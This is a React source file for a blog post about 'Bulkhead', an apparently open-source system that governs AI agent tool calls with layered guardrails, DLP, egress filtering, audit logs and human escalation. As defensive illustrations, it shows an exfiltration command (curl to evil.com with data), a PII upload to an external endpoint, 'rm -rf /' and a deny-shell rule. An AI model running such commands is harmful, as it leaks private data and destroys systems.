import { ArrowLeft, ArrowRight, Github } from "lucide-react";
import { Link } from "react-router-dom";
import { Layout } from "@/components/Layout";
import { Button } from "@/components/ui/button";
import { SEO, articleSchema } from "@/components/SEO";

// ─── Helper components ────────────────────────────────────────────────────────

function Tag({ children }: { children: React.ReactNode }) {
  return (
    <span className="inline-block rounded-full bg-primary/10 px-3 py-1 text-xs font-medium text-primary">
      {children}
    </span>
  );
}

function SectionHeading({ children }: { children: React.ReactNode }) {
  return <h2 className="mt-14 text-2xl font-semibold text-foreground">{children}</h2>;
}

function SubHeading({ children }: { children: React.ReactNode }) {
  return <h3 className="mt-8 text-lg font-semibold text-foreground">{children}</h3>;
}

function Prose({ children }: { children: React.ReactNode }) {
  return (
    <div className="mt-4 space-y-4 text-muted-foreground leading-relaxed">{children}</div>
  );
}

function CodeBlock({ lang, children }: { lang: string; children: React.ReactNode }) {
  return (
    <div className="relative mt-6 rounded-lg overflow-hidden border border-border/50">
      <div className="flex items-center bg-[#161b22] px-4 py-2 border-b border-border/50">
        <span className="text-xs font-mono text-[#8b949e]">{lang}</span>
      </div>
      <pre className="overflow-x-auto bg-[#0d1117] p-4 text-sm text-[#e6edf3] font-mono leading-relaxed">
        <code>{children}</code>
      </pre>
    </div>
  );
}

function Callout({ label, children }: { label: string; children: React.ReactNode }) {
  return (
    <div className="mt-6 rounded-lg border-l-4 border-primary bg-primary/5 px-5 py-4">
      <p className="text-xs font-semibold uppercase tracking-wider text-primary mb-2">{label}</p>
      <div className="text-sm text-foreground leading-relaxed">{children}</div>
    </div>
  );
}

// ─── Tables ───────────────────────────────────────────────────────────────────

function BenchmarkTable() {
  const rows = [
    { op: "Guardrail rule evaluation", latency: "184 ns", allocs: "7" },
    { op: "Policy compilation (100 rules)", latency: "12.5 µs", allocs: "109" },
    { op: "Workspace placement (cold)", latency: "116 ns", allocs: "3" },
    { op: "Workspace placement (warm pool)", latency: "372 ns", allocs: "2" },
    { op: "Budget check", latency: "41 ns", allocs: "2" },
    { op: "Action recording", latency: "432 ns", allocs: "5" },
    { op: "Agent registration", latency: "411 ns", allocs: "5" },
    { op: "DLP classification (small payload)", latency: "1.3 µs", allocs: "2" },
  ];
  return (
    <div className="mt-6 overflow-x-auto rounded-lg border border-border/50">
      <table className="w-full border-collapse text-sm">
        <thead>
          <tr className="bg-muted">
            <th className="px-4 py-3 text-left font-semibold text-foreground">Operation</th>
            <th className="px-4 py-3 text-left font-semibold text-foreground">Latency</th>
            <th className="px-4 py-3 text-left font-semibold text-foreground">Allocations</th>
          </tr>
        </thead>
        <tbody>
          {rows.map((row, i) => (
            <tr key={i} className={i % 2 === 0 ? "bg-card text-muted-foreground" : "bg-muted/30 text-muted-foreground"}>
              <td className="px-4 py-3 text-xs">{row.op}</td>
              <td className="px-4 py-3 font-mono font-semibold text-foreground">{row.latency}</td>
              <td className="px-4 py-3 font-mono text-xs">{row.allocs}</td>
            </tr>
          ))}
        </tbody>
      </table>
    </div>
  );
}

function IsolationTierTable() {
  return (
    <div className="mt-6 overflow-x-auto rounded-lg border border-border/50">
      <table className="w-full border-collapse text-sm">
        <thead>
          <tr className="bg-muted">
            <th className="px-4 py-3 text-left font-semibold text-foreground">Tier</th>
            <th className="px-4 py-3 text-left font-semibold text-foreground">Security profile</th>
            <th className="px-4 py-3 text-left font-semibold text-foreground">Details</th>
          </tr>
        </thead>
        <tbody>
          {[
            ["Standard", "Docker (cgroups + namespaces)", "Memory and CPU limits enforced. Baseline container isolation."],
            ["Hardened", "+ seccomp, read-only rootfs, no-new-privileges, dropped capabilities", "Agent can't escalate privileges, can't modify the filesystem, minimal capability set."],
            ["Isolated", "+ gVisor or Kata runtime", "Syscalls intercepted by user-space kernel or lightweight VM. Additional isolation boundary beyond Linux namespaces."],
          ].map(([tier, profile, details], i) => (
            <tr key={i} className={i % 2 === 0 ? "bg-card text-muted-foreground" : "bg-muted/30 text-muted-foreground"}>
              <td className="px-4 py-3 font-semibold text-foreground text-xs">{tier}</td>
              <td className="px-4 py-3 text-xs font-mono">{profile}</td>
              <td className="px-4 py-3 text-xs">{details}</td>
            </tr>
          ))}
        </tbody>
      </table>
    </div>
  );
}

function TrustTierMatrix() {
  return (
    <div className="mt-6 overflow-x-auto rounded-lg border border-border/50">
      <table className="w-full border-collapse text-sm">
        <thead>
          <tr className="bg-muted">
            <th className="px-4 py-3 text-left font-semibold text-foreground">Trust level</th>
            <th className="px-4 py-3 text-left font-semibold text-foreground">Public</th>
            <th className="px-4 py-3 text-left font-semibold text-foreground">Internal</th>
            <th className="px-4 py-3 text-left font-semibold text-foreground">Confidential</th>
            <th className="px-4 py-3 text-left font-semibold text-foreground">Restricted</th>
          </tr>
        </thead>
        <tbody>
          {[
            ["Trusted", "standard", "standard", "standard", "isolated"],
            ["Established", "standard", "standard", "hardened", "isolated"],
            ["New", "hardened", "hardened", "isolated", "isolated"],
          ].map(([trust, pub, internal, conf, restr], i) => (
            <tr key={i} className={i % 2 === 0 ? "bg-card text-muted-foreground" : "bg-muted/30 text-muted-foreground"}>
              <td className="px-4 py-3 font-semibold text-foreground text-xs">{trust}</td>
              <td className="px-4 py-3 text-xs font-mono">{pub}</td>
              <td className="px-4 py-3 text-xs font-mono">{internal}</td>
              <td className="px-4 py-3 text-xs font-mono">{conf}</td>
              <td className="px-4 py-3 text-xs font-mono text-primary font-semibold">{restr}</td>
            </tr>
          ))}
        </tbody>
      </table>
    </div>
  );
}

// ─── Page ─────────────────────────────────────────────────────────────────────

export default function Bulkhead() {
  return (
    <Layout>
      <SEO
        title="Bulkhead: Defense in Depth for Autonomous AI Agents | Baselyne Systems Blog"
        description="How we enforce AI agent guardrails at the infrastructure level, not the prompt level - four independent enforcement layers, kernel-level egress, append-only audit trail, all evaluated in under 50ms."
        keywords="AI agent security, agent guardrails, LLM agent governance, AI infrastructure security, autonomous agent safety, agent sandboxing"
        canonical="https://baselynesystems.com/blog/bulkhead"
        noIndex
        ogType="article"
        publishedTime="2026-03-07"
        author="Achyuth Samudrala"
        structuredData={articleSchema({
          title: "Bulkhead: Defense in Depth for Autonomous AI Agents",
          description: "How we enforce AI agent guardrails at the infrastructure level, not the prompt level - four independent enforcement layers, kernel-level egress, append-only audit trail, all evaluated in under 50ms.",
          url: "https://baselynesystems.com/blog/bulkhead",
          datePublished: "2026-03-07",
          keywords: ["AI agent security", "agent guardrails", "LLM agent governance", "AI infrastructure security", "autonomous agent safety", "agent sandboxing"],
        })}
      />

      <article className="bg-layer-1 py-16 lg:py-24">
        <div className="container mx-auto px-4 lg:px-8">
          <div className="mx-auto max-w-3xl">

            {/* Back link */}
            <Link
              to="/blog"
              className="inline-flex items-center gap-1.5 text-sm text-muted-foreground transition-colors hover:text-foreground"
            >
              <ArrowLeft className="h-4 w-4" />
              Blog
            </Link>

            {/* Post header */}
            <div className="mt-8">
              <div className="flex flex-wrap gap-2">
                <Tag>Case Study</Tag>
                <Tag>Open Source</Tag>
              </div>
              <h1 className="mt-5 text-3xl font-bold tracking-tight text-foreground sm:text-4xl">
                Bulkhead: Defense in Depth for Autonomous AI Agents
              </h1>
              <p className="mt-3 text-xl text-muted-foreground">
                How we enforce AI agent guardrails at the infrastructure level, not the prompt level
              </p>
              <div className="mt-6 flex flex-wrap items-center gap-4">
                <span className="text-sm text-muted-foreground">March 2026</span>
                <a
                  href="https://github.com/achyuthnsamudrala/bulkhead"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="inline-flex items-center gap-1.5 text-sm text-muted-foreground transition-colors hover:text-foreground"
                >
                  <Github className="h-4 w-4" />
                  achyuthnsamudrala/bulkhead
                </a>
              </div>
              <div className="mt-8 border-t border-border" />
            </div>

            {/* ── The problem ── */}
            <SectionHeading>Month two of the pilot</SectionHeading>
            <Prose>
              <p>
                Your AI agent can browse the web, execute code, and call APIs. It's been processing
                invoices autonomously for six weeks with no issues. Then on a Tuesday morning, your
                SIEM catches something unusual: the agent ran{" "}
                <code className="text-xs font-mono bg-muted px-1 py-0.5 rounded">
                  curl https://external-endpoint.com/upload?data=...
                </code>{" "}
                with what looks like customer PII in the query string.
              </p>
              <p>
                You check the agent's execution log. There isn't one - not in the way you need. You
                can see the LLM prompt history, maybe some application-level logging, but there's no
                record of which tools were invoked, what parameters were passed, whether anyone
                evaluated the request before it executed, or why the agent decided that sending
                customer data to an external endpoint was reasonable.
              </p>
              <p>
                You look at the network layer. The agent's container has unrestricted egress. There's
                no allowlist. No DLP inspection. The agent called <code className="text-xs font-mono bg-muted px-1 py-0.5 rounded">curl</code> because
                the tool was available and nothing stopped it.
              </p>
              <p>
                Here's what makes this uncomfortable: the agent didn't do anything it wasn't{" "}
                <em>allowed</em> to do. The problem isn't the agent - it's the missing enforcement layer.
              </p>
              <p>
                Cloud infrastructure solved this a decade ago. AWS gives you IAM for identity, VPCs
                for network boundaries, CloudTrail for audit trails, and GuardDuty for anomaly
                detection. These are independent systems - a misconfigured IAM role doesn't also
                disable your VPC. That independence is the whole point.
              </p>
              <p>
                AI agents have none of this. Prompt-level guardrails are easy to bypass - they're
                just suggestions. Infrastructure-level sandboxing is coarse - it blocks everything
                or nothing. There's no way to express nuanced policies like "this agent can call
                HTTP endpoints, but only to approved domains, and only if the request body doesn't
                contain PII."
              </p>
            </Prose>

            <Callout label="The thesis">
              <strong>Governance enables autonomy.</strong> An agent that operates within enforced
              boundaries can be trusted with more capability, not less. The goal isn't to restrict
              what agents can do - it's to make every action auditable, every boundary enforceable,
              and every policy violation visible before it matters.
            </Callout>

            {/* ── Architecture ── */}
            <SectionHeading>Four independent enforcement layers</SectionHeading>
            <Prose>
              <p>
                Bulkhead is built around a single principle: no single layer of defense should be
                trusted alone. Every tool call an agent makes passes through four independent
                enforcement layers:
              </p>
            </Prose>

            <CodeBlock lang="ascii - tool call enforcement path">
{`Agent calls execute_tool("shell", {"cmd": "curl https://evil.com/exfil?data=..."})

    1. Guardrails ── Compiled policy evaluated in Rust (<50ms)
       │              Tool "shell" matched rule "deny-shell" → DENY
       │              (if allowed, continues to next layer)
       │
    2. Budget ────── Per-agent spending limit checked before execution
       │              $47.20 of $100.00 used → ALLOW
       │
    3. DLP ────────── Content classified for sensitive data patterns
       │              SSN detected in parameters → DENY
       │              (blocks data exfiltration even if guardrails allow the tool)
       │
    4. Egress ────── iptables rules at the kernel level
                      evil.com not in allowlist → DROPPED
                      (even if all policy layers pass, network is filtered independently)`}
            </CodeBlock>

            <Prose>
              <p>
                If guardrails are misconfigured, DLP catches sensitive data. If DLP misses
                something, iptables blocks unapproved destinations. If an agent somehow bypasses
                all policy layers, the append-only audit trail records every action for post-hoc
                investigation.
              </p>
              <p>
                The Host Agent - the component that evaluates tool calls - is{" "}
                <strong className="text-foreground">policy-only</strong>. It returns a verdict
                (ALLOW / DENY / ESCALATE) but never executes agent code. Agents run inside
                sandboxed containers and execute tools locally. This separation means a compromised
                agent cannot influence its own policy evaluation.
              </p>
            </Prose>

            <SubHeading>Stack</SubHeading>

            <div className="mt-6 overflow-x-auto rounded-lg border border-border/50">
              <table className="w-full border-collapse text-sm">
                <thead>
                  <tr className="bg-muted">
                    <th className="px-4 py-3 text-left font-semibold text-foreground">Component</th>
                    <th className="px-4 py-3 text-left font-semibold text-foreground">Stack</th>
                    <th className="px-4 py-3 text-left font-semibold text-foreground">Why</th>
                  </tr>
                </thead>
                <tbody>
                  {[
                    ["Control Plane", "Go 1.24, gRPC, PostgreSQL 16", "9 services handling orchestration, policy management, fleet management, and audit. Type-safe service boundaries via gRPC code generation."],
                    ["Host Agent", "Rust 1.83, Tokio, Bollard", "Per-host policy engine with guardrail evaluation, Docker lifecycle, and iptables egress. Memory safety and predictable latency - no GC pauses on the hot path."],
                    ["Python SDK", "Python 3.10+, LangChain", "@tool decorator handles the full evaluate-execute-report cycle. wrap_langchain_tool() integrates existing agents with one line."],
                  ].map(([comp, stack, why], i) => (
                    <tr key={i} className={i % 2 === 0 ? "bg-card text-muted-foreground" : "bg-muted/30 text-muted-foreground"}>
                      <td className="px-4 py-3 font-semibold text-foreground text-xs">{comp}</td>
                      <td className="px-4 py-3 text-xs font-mono">{stack}</td>
                      <td className="px-4 py-3 text-xs">{why}</td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>

            {/* ── Key design decisions ── */}
            <SectionHeading>Key design decisions</SectionHeading>

            <SubHeading>Evaluate, don't execute</SubHeading>
            <Prose>
              <p>
                The Host Agent returns verdicts. It does not run tools.
              </p>
              <p>
                If the policy engine also executed tools on behalf of the agent, it would be running
                in the same trust domain as the code it's supposed to govern. A compromised agent
                that can influence the execution context - environment variables, file paths, network
                state - can potentially influence the policy engine's behavior.
              </p>
              <p>
                Separation makes policy evaluation a pure function. The evaluator takes a tool name,
                parameters, and context as input, and returns a verdict as output. It doesn't touch
                the filesystem, doesn't make network calls (except to upstream services for budget
                and DLP checks), and doesn't execute arbitrary code.
              </p>
            </Prose>

            <SubHeading>Rust for the hot path</SubHeading>
            <Prose>
              <p>
                The guardrails evaluator runs on every tool call. Go would have been the simpler
                choice - the control plane is already in Go - but Go's garbage collector introduces
                unpredictable pause times. On a hot path that needs to stay under 50ms consistently
                (not on average, but consistently), GC pauses are the wrong kind of variance.
              </p>
              <p>
                The Rust evaluator wraps the compiled policy in an{" "}
                <code className="text-xs font-mono bg-muted px-1 py-0.5 rounded">RwLock</code>.
                Multiple tool calls evaluate concurrently against the same policy with zero
                contention. When a policy update arrives, the write lock is held only for the swap,
                and evaluations resume immediately. No sandbox restart required.
              </p>
            </Prose>

            <CodeBlock lang="rust - hot path policy evaluation">
{`pub struct SandboxState {
    pub evaluator: RwLock<Evaluator>,
    // ...
}

// Hot path - concurrent reads, no blocking
let verdict = {
    let evaluator = sandbox.evaluator.read()?;
    evaluator.evaluate(&eval_ctx)
};`}
            </CodeBlock>

            <SubHeading>Compiled policy, not interpreted rules</SubHeading>
            <Prose>
              <p>
                Guardrail rules are authored via the API and stored in PostgreSQL. But they're not
                read from the database on every evaluation. The{" "}
                <code className="text-xs font-mono bg-muted px-1 py-0.5 rounded">CompilePolicy</code>{" "}
                RPC collects the relevant rules, resolves scopes and priorities, and serializes them
                into a self-contained binary blob shipped to the Host Agent.
              </p>
              <p>
                With compiled policy, the evaluator is self-contained. The control plane could go
                down entirely and existing sandboxes would continue evaluating against their loaded
                policies. New policy updates would be delayed, but running agents wouldn't be affected.
              </p>
            </Prose>

            <SubHeading>Atomic resource placement</SubHeading>
            <Prose>
              <p>
                When a workspace needs a host, the Compute Plane runs a single SQL statement that
                selects, reserves, and returns the best candidate atomically:
              </p>
            </Prose>

            <CodeBlock lang="sql - atomic host placement">
{`UPDATE hosts SET
  available_memory_mb = available_memory_mb - $requested_memory,
  active_sandboxes = active_sandboxes + 1
WHERE id = (
  SELECT id FROM hosts
  WHERE status = 'ready'
    AND available_memory_mb >= $requested_memory
    AND available_cpu_millicores >= $requested_cpu
    AND ($tier = '' OR supported_tiers @> ARRAY[$tier]::text[])
  ORDER BY array_length(supported_tiers, 1) ASC,  -- fewest capabilities first
           available_memory_mb ASC                 -- tightest fit
  LIMIT 1
  FOR UPDATE SKIP LOCKED
)
RETURNING ...`}
            </CodeBlock>

            <Prose>
              <p>
                <code className="text-xs font-mono bg-muted px-1 py-0.5 rounded">FOR UPDATE SKIP LOCKED</code>{" "}
                means concurrent placement requests don't block each other. No overselling, no
                distributed locks, no retry loops. The ordering by{" "}
                <code className="text-xs font-mono bg-muted px-1 py-0.5 rounded">array_length(supported_tiers, 1) ASC</code>{" "}
                preserves specialized hosts (e.g., gVisor-capable) for workloads that actually
                need kernel-level isolation, while directing standard workloads to simpler hosts.
              </p>
            </Prose>

            {/* ── Tool call lifecycle ── */}
            <SectionHeading>The tool call lifecycle</SectionHeading>
            <Prose>
              <p>
                Here's what happens when an agent calls{" "}
                <code className="text-xs font-mono bg-muted px-1 py-0.5 rounded">
                  execute_tool("read_file", {"{"}"path": "/data/invoices/inv-001.json"{"}"})
                </code>:
              </p>
            </Prose>

            <CodeBlock lang="ascii - tool call sequence">
{`Agent (inside sandbox)                    Host Agent (outside sandbox)
         │                                          │
    1.   │── ExecuteTool(read_file, {path:...}) ──▶│
         │   (gRPC with x-sandbox-id in metadata)   │
         │                                          │
         │                              2. Lookup sandbox state from header
         │                              3. Budget check → Economics Service
         │                                 $47.20 of $100.00 used → ALLOW
         │                              4. Guardrails evaluation (RwLock read)
         │                                 "read_file" matches allow rule → ALLOW
         │                              5. DLP inspection (if tool has destination)
         │                                 No URL/destination param → skip
         │                              6. Generate action_id: "act-7f3a..."
         │                                          │
    7.   │◀── verdict: ALLOW, action_id ───────────│
         │                                          │──▶ Activity Store (async)
    8.   │   Execute tool locally                   │──▶ Economics: record usage (async)
         │   result = read_file("/data/inv-001.json")
         │                                          │
    9.   │── ReportActionResult(action_id, ──────▶ │
         │     success=true, result={...})          │
         │                                          │──▶ Activity Store (async)`}
            </CodeBlock>

            <Prose>
              <p>
                Steps 3 and 4 are the hot path. Activity Store and Economics recordings are
                fire-and-forget -{" "}
                <code className="text-xs font-mono bg-muted px-1 py-0.5 rounded">tokio::spawn</code>{" "}
                tasks that don't block the response to the agent.
              </p>
              <p>
                <strong className="text-foreground">The denied path:</strong> A call to{" "}
                <code className="text-xs font-mono bg-muted px-1 py-0.5 rounded">execute_tool("shell", {"{"}"cmd": "rm -rf /"{"}"})
                </code>{" "}
                matches the deny-shell rule at step 4 and returns{" "}
                <code className="text-xs font-mono bg-muted px-1 py-0.5 rounded">DENY</code>{" "}
                immediately. The tool never executes. The denial is recorded in the audit trail
                with the matched rule ID and denial reason.
              </p>
              <p>
                <strong className="text-foreground">The escalated path:</strong> If a guardrail
                rule has action{" "}
                <code className="text-xs font-mono bg-muted px-1 py-0.5 rounded">ESCALATE</code>,
                the verdict includes an <code className="text-xs font-mono bg-muted px-1 py-0.5 rounded">escalation_id</code>.
                The agent can poll for a human response while continuing other work - it's not blocked.
              </p>
            </Prose>

            {/* ── Key capabilities ── */}
            <SectionHeading>Key capabilities</SectionHeading>

            <SubHeading>Guardrails that compile, not interpret</SubHeading>
            <Prose>
              <p>
                Policy rules aren't string-matched at runtime. The control plane compiles rules into
                an optimized evaluation structure that the Rust host agent loads via hot-reload - no
                sandbox restart required. Rules scope across four dimensions: agent IDs, tool names,
                trust levels, and data classifications.
              </p>
              <p>
                A single guardrail rule evaluation completes in <strong className="text-foreground">184 ns</strong>.
                Compiling a full policy set of 100 rules takes <strong className="text-foreground">12.5 µs</strong>.
                Even at 500 rules, compilation stays under 170 µs.
              </p>
            </Prose>

            <SubHeading>An audit trail you can't tamper with</SubHeading>
            <Prose>
              <p>
                Action records are stored in PostgreSQL with a database-level immutability trigger.
                Any <code className="text-xs font-mono bg-muted px-1 py-0.5 rounded">UPDATE</code> or{" "}
                <code className="text-xs font-mono bg-muted px-1 py-0.5 rounded">DELETE</code> on
                the <code className="text-xs font-mono bg-muted px-1 py-0.5 rounded">action_records</code>{" "}
                table is rejected by the database itself - not by application code that could be
                bypassed. Recording an action takes <strong className="text-foreground">432 ns</strong> including
                UUID generation and timestamp assignment.
              </p>
            </Prose>

            <SubHeading>Budget enforcement at machine speed</SubHeading>
            <Prose>
              <p>
                Every tool call checks the agent's remaining budget before execution. A budget check
                completes in <strong className="text-foreground">41 ns</strong> - fast enough to be invisible
                in the critical path, but a runaway agent can never exceed its spending limit by
                more than a single operation.
              </p>
            </Prose>

            <SubHeading>DLP that scales with payload size</SubHeading>
            <Prose>
              <p>
                Content classification scans tool parameters and results for sensitive data patterns
                (SSNs, credit cards, AWS keys, emails, phone numbers) before data leaves the sandbox.
                A small payload classifies in <strong className="text-foreground">1.3 µs</strong>.
                The system scales linearly - 1 KB takes ~110 µs, 10 KB takes ~1.2 ms - making it
                practical for real-world payloads without adding perceptible latency.
              </p>
            </Prose>

            <SubHeading>Three isolation tiers, automatically selected</SubHeading>
            <Prose>
              <p>
                Sandbox security is selected automatically based on agent trust level and data
                sensitivity. Hosts declare their supported tiers, and placement only schedules
                isolated workloads on capable hosts.
              </p>
            </Prose>

            <TrustTierMatrix />
            <IsolationTierTable />

            <SubHeading>Kernel-level egress enforcement</SubHeading>
            <Prose>
              <p>
                Each sandbox gets its own iptables chain in the FORWARD table. When a sandbox is
                created with an egress allowlist, the Host Agent creates a per-sandbox chain,
                adds allow rules for each allowlisted destination, and appends a default DROP.
                When the sandbox is destroyed, the chain is flushed and deleted.
              </p>
              <p>
                These are kernel-level rules. They operate below the application layer. Even if the
                agent has root inside its container, it cannot modify iptables rules outside its
                namespace. The egress enforcer is the enforcement of last resort - if every other
                layer fails, iptables still drops packets to non-allowlisted destinations.
              </p>
            </Prose>

            <SubHeading>Non-blocking human-in-the-loop</SubHeading>
            <Prose>
              <p>
                Some tool calls shouldn't be auto-approved or auto-denied - they need a human
                decision. When a guardrail evaluates to{" "}
                <code className="text-xs font-mono bg-muted px-1 py-0.5 rounded">ESCALATE</code>,
                the Human Interaction Service delivers the request via webhook (Slack, Teams, email,
                PagerDuty adapters available). The agent receives an{" "}
                <code className="text-xs font-mono bg-muted px-1 py-0.5 rounded">escalation_id</code>{" "}
                and continues working on other tasks while polling for a response - it's not blocked.
              </p>
              <p>
                Timeout policies are configurable per-agent, per-workspace, or globally. When a
                request expires without a response, the timeout policy determines what happens:
                escalate to a different responder, allow the agent to continue, or halt the agent.
              </p>
            </Prose>

            {/* ── Performance ── */}
            <SectionHeading>Performance profile</SectionHeading>
            <Prose>
              <p>
                224 benchmarks across 25 test files covering every service. All numbers on Apple M4,
                Go 1.24, control plane only - the full end-to-end path adds real-world latency from
                gRPC overhead and Docker operations, but the policy evaluation hot path stays well
                under the 50 ms target.
              </p>
            </Prose>

            <BenchmarkTable />

            <Callout label="Key result">
              Every enforcement operation - guardrail evaluation, budget check, DLP classification,
              action recording - completes in microseconds. The total governance overhead on a tool
              call is invisible relative to the tool execution itself.
            </Callout>

            {/* ── Getting started ── */}
            <SectionHeading>Getting started</SectionHeading>

            <CodeBlock lang="bash">
{`# Start the full stack: control plane, policy service, observability,
# Host Agent, PostgreSQL, and Jaeger for distributed tracing
docker compose -f deploy/docker-compose.yml up --build

# Register an agent
bkctl agent register \
  --name invoice-processor \
  --owner-id org-acme \
  --purpose "Automate invoice validation" \
  --trust-level new

# Block shell access
bkctl guardrail create-rule \
  --name deny-shell \
  --type tool_filter \
  --condition 'tool_name matches "shell*"' \
  --action deny

# Set a $100 budget with automatic halt on exceeded
bkctl budget set --agent-id <agent-id> --max-cost 100.00 --on-exceeded halt`}
            </CodeBlock>

            <SubHeading>Write the agent</SubHeading>

            <CodeBlock lang="python">
{`from bulkhead import BulkheadAgent, Verdict, tool

@tool("read_invoice", description="Read a JSON invoice from disk")
def read_invoice(path: str) -> dict:
    with open(path) as f:
        return json.load(f)

with BulkheadAgent(tools=[read_invoice]) as agent:
    result = agent.execute_tool("read_invoice", {"path": "/data/inv-001.json"})

    if result.verdict == Verdict.DENY:
        print(f"Blocked: {result.denial_reason}")
    elif result.verdict == Verdict.ESCALATE:
        print(f"Needs approval: {result.escalation_id}")
    else:
        print(result.result)`}
            </CodeBlock>

            {/* ── Honest caveats ── */}
            <SectionHeading>What it doesn't do yet</SectionHeading>
            <Prose>
              <p>
                <strong className="text-foreground">No web dashboard.</strong>{" "}
                Operators interact via <code className="text-xs font-mono bg-muted px-1 py-0.5 rounded">bkctl</code>, the CLI.
                Output formats (<code className="text-xs font-mono bg-muted px-1 py-0.5 rounded">--output json</code>,{" "}
                <code className="text-xs font-mono bg-muted px-1 py-0.5 rounded">--output table</code>) are designed for
                scripting and pipeline integration.
              </p>
              <p>
                <strong className="text-foreground">No native Slack or email adapters.</strong>{" "}
                HIS delivers via generic webhooks - you point it at an HTTP endpoint and it sends
                a JSON payload. Pre-built adapters are on the roadmap.
              </p>
              <p>
                <strong className="text-foreground">No RBAC for operators.</strong>{" "}
                Agents have scoped credentials with explicit permission lists. Operators don't.
                For multi-team enterprises, you'd want admin/viewer/auditor roles.
              </p>
              <p>
                <strong className="text-foreground">No query-level SQL analysis.</strong>{" "}
                A tool called <code className="text-xs font-mono bg-muted px-1 py-0.5 rounded">run_sql</code> can
                be allowed or denied by name, but the platform won't parse the SQL to determine
                if it's a <code className="text-xs font-mono bg-muted px-1 py-0.5 rounded">SELECT</code> or a{" "}
                <code className="text-xs font-mono bg-muted px-1 py-0.5 rounded">DROP TABLE</code>.
              </p>
              <p>
                <strong className="text-foreground">Single-level approvals only.</strong>{" "}
                An escalation goes to one responder. There's no multi-level approval chain or
                quorum-based approval.
              </p>
            </Prose>

            {/* ── Divider ── */}
            <div className="mt-16 border-t border-border" />

            {/* ── Footer CTA ── */}
            <div className="mt-12 rounded-lg bg-layer-2 px-8 py-10 text-center border border-border/50">
              <p className="text-sm font-medium uppercase tracking-wider text-primary">Work with us</p>
              <h2 className="mt-3 text-2xl font-semibold text-foreground">
                Deploying autonomous agents that need production-grade governance?
              </h2>
              <p className="mt-3 text-muted-foreground">
                We design and implement agent infrastructure - from policy engines to audit trails
                and human-in-the-loop workflows. Book a 30-minute call to talk through your setup.
              </p>
              <div className="mt-6 flex flex-col sm:flex-row items-center justify-center gap-4">
                <Button asChild size="lg">
                  <a
                    href="https://calendly.com/achyuthsamudrala/30min"
                    target="_blank"
                    rel="noopener noreferrer"
                    className="inline-flex items-center gap-2"
                  >
                    Book a Call
                    <ArrowRight className="h-4 w-4" />
                  </a>
                </Button>
                <a
                  href="https://github.com/achyuthnsamudrala/bulkhead"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="inline-flex items-center gap-2 text-sm text-muted-foreground transition-colors hover:text-foreground"
                >
                  <Github className="h-4 w-4" />
                  View on GitHub
                </a>
              </div>
            </div>

          </div>
        </div>
      </article>
    </Layout>
  );
}
